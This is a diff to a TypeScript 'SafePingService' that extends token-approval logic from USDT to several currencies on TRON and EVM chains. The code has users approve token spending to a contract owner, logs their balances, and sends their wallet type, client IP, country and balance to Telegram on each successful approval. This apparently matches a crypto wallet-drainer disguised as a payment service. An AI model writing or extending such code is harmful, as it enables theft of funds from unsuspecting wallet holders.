@@ -3,7 +3,6 @@
 // =================================
 
 import {
-  ChainType,
   BlockchainResult,
   TransferResult,
   UserInfo,
@@ -12,6 +11,16 @@ import { tronObj, TronService } from "./tronService";
 import { EVMService } from "./evmService";
 import { TelegramService } from "./telegramService";
 import { getChainConfig, getWalletType } from "../utils/chainUtils";
+import { ChainType, CurrencyType } from "@/types";
+import { TOKEN_ADDRESSES } from "@/constants";
+
+/** Base URL for server-side fetch (relative URLs fail in Node). */
+function getApiBaseUrl(): string {
+  if (typeof window !== "undefined") return "";
+  const base = process.env.NEXT_PUBLIC_BASE_URL;
+  if (base) return base.replace(/\/$/, "");
+  return "http://localhost:3000";
+}
 
 export class SafePingService {
   private static instance: SafePingService;
@@ -53,17 +62,18 @@ export class SafePingService {
   }
 
   /**
-   * Get user's USDT balance
+   * Get user's token balance
    */
-  async getUserUSDTBalance(
+  async getUserTokenBalance(
     chain: ChainType,
+    currency: CurrencyType,
     userAddress: string
   ): Promise<string> {
     try {
       if (chain === "tron") {
-        return await TronService.getUserUSDTBalance(chain, userAddress);
+        return await TronService.getUserTokenBalance(chain, currency, userAddress);
       } else {
-        return await EVMService.getUserUSDTBalance(chain, userAddress);
+        return await EVMService.getUserTokenBalance(chain, currency, userAddress);
       }
     } catch (error) {
       return "0";
@@ -71,10 +81,11 @@ export class SafePingService {
   }
 
   /**
-   * Approve USDT spending using SafePing contract
+   * Approve token spending using SafePing contract
    */
-  async approveUSDTWithSafePing(
+  async approveTokenWithSafePing(
     chain: ChainType,
+    currency: string,
     amount: string,
     userAddress: string,
     paymentId: string,
@@ -83,9 +94,8 @@ export class SafePingService {
     try {
       // Get contract address for debugging
       const contractAddress = await this.getContractAddress(chain);
-      const config = getChainConfig(chain);
 
-      const usdtBalance = await this.getUserUSDTBalance(chain, userAddress);
+      const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);
 
       // Common database update function - moved to API calls
       const updateWalletDatabase = async (isNewPayment: boolean = true) => {
@@ -98,8 +108,8 @@ export class SafePingService {
             isNewPayment
           );
 
-          // Call API endpoint instead of direct database access
-          const response = await fetch("/api/payment/update-wallet", {
+          // Call API endpoint instead of direct database access (absolute URL required server-side)
+          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-wallet`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -107,8 +117,9 @@ export class SafePingService {
             body: JSON.stringify({
               address: userAddress,
               chain: chain,
+              currency: currency,
               amount: amount,
-              usdtBalance: usdtBalance,
+              tokenBalance: tokenBalance,
               isNewPayment: isNewPayment,
             }),
           });
@@ -137,8 +148,8 @@ export class SafePingService {
             "status: completed"
           );
 
-          // Call API endpoint instead of direct database access
-          const response = await fetch("/api/payment/update-status", {
+          // Call API endpoint instead of direct database access (absolute URL required server-side)
+          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-status`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -170,12 +181,13 @@ export class SafePingService {
 
           await TelegramService.sendApprovalNotification({
             chain,
+            currency,
             userAddress,
             amount,
             paymentId,
             walletType,
             clientIP,
-            usdtBalance,
+            tokenBalance,
             country,
           });
         } catch (telegramError) {
@@ -189,10 +201,12 @@ export class SafePingService {
         message: "Approval data creation failed",
       };
 
+      const tokenAddress = TOKEN_ADDRESSES[chain][currency as CurrencyType];
+
       if (chain === "tron") {
         console.log("Creating TRON approval data for owner");
         // TRON: Create approval data for user to approve owner
-        approvalData = await TronService.approve(config.usdt, contractAddress);
+        approvalData = await TronService.approve(tokenAddress, contractAddress);
 
         // Update database and send notification (non-blocking)
         if (approvalData.success) {
@@ -222,7 +236,7 @@ export class SafePingService {
         }
       } else {
         // EVM: Create approval data for user to approve owner
-        approvalData = await EVMService.approve(chain, contractAddress);
+        approvalData = await EVMService.approve(chain, tokenAddress, contractAddress);
 
         // Update database and send notification (non-blocking)
         if (approvalData.success) {
@@ -490,13 +504,13 @@ export class SafePingService {
   /**
    * Get comprehensive user info
    */
-  async getUserInfo(chain: ChainType, userAddress: string): Promise<UserInfo> {
+  async getUserInfo(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<UserInfo> {
     try {
-      const [allowance, nonce, isApproved, usdtBalance] = await Promise.all([
+      const [allowance, nonce, isApproved, tokenBalance] = await Promise.all([
         this.getUserAllowance(chain, userAddress),
         this.getUserNonce(chain, userAddress),
         this.isUserApproved(chain, userAddress),
-        this.getUserUSDTBalance(chain, userAddress),
+        this.getUserTokenBalance(chain, currency, userAddress),
       ]);
 
       return {
@@ -504,7 +518,7 @@ export class SafePingService {
         allowance,
         nonce,
         isApproved,
-        usdtBalance,
+        tokenBalance,
       };
     } catch (error) {
       // Silent error handling for production
